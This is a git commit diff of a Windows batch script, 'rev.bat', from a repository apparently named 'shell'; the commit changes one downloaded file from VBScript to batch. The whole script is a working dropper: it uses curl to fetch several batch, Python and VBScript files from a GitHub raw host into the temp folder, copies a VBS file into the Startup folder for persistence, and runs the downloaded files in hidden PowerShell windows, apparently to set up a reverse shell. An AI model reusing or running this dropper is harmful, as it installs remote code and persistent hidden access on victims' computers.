cd4d05721da2c9483da8b1777054cdffffdd2084
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-05 20:44:15 +0300

    Update rev.bat

--- rev.bat
+++ rev.bat
@@ -2,10 +2,10 @@
 curl https://raw.githubusercontent.com/0x2034/shell/main/pro.bat -o %temp%\pro.bat
 curl https://raw.githubusercontent.com/0x2034/shell/main/sh.py -o %temp%\sh.py
 curl https://raw.githubusercontent.com/0x2034/shell/main/vb.bat -o %temp%\vb.bat
-curl https://raw.githubusercontent.com/0x2034/shell/main/vb1.vbs -o "%temp%\vb1.vbs"
+curl https://raw.githubusercontent.com/0x2034/shell/main/vb1.bat -o "%temp%\vb1.bat"
 curl https://raw.githubusercontent.com/0x2034/shell/main/post.bat -o "%temp%\post.bat"
 curl https://raw.githubusercontent.com/0x2034/shell/main/post.vbs -o "%temp%\post.vbs"
 move "%temp%\post.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 powershell -c "Start-Process -FilePath "%temp%\vb.bat" -WindowStyle Hidden"
-powershell -c "Start-Process -FilePath "%temp%\vb1.vbs" -WindowStyle Hidden"
+powershell -c "Start-Process -FilePath "%temp%\vb1.bat" -WindowStyle Hidden"
 exit
